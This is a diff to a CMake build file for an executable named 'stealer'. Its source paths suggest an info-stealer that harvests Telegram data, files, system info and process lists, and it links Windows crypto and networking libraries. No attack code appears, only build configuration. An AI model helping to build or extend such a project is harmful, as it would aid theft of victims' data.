@@ -5,7 +5,6 @@ set(CMAKE_CXX_STANDARD 20)
 set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -mssse3")
 set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -mssse3")
 
-
 add_definitions(-DDEV=true)
 
 include_directories(include)
@@ -37,6 +36,12 @@ add_executable(stealer src/main.cpp
         src/stealer/impl/socials/impl/Telegram.h
         src/stealer/impl/files/Files.cpp
         src/stealer/impl/files/Files.h
+        src/stealer/impl/Info.cpp
+        src/stealer/impl/Info.h
+        src/utils/OSUtil.cpp
+        src/utils/OSUtil.h
+        src/stealer/impl/Processes.cpp
+        src/stealer/impl/Processes.h
 )
 
 target_link_libraries(stealer
@@ -53,4 +58,5 @@ target_link_libraries(stealer
         crypt32
         bcrypt
         wininet
+        Ws2_32
 )
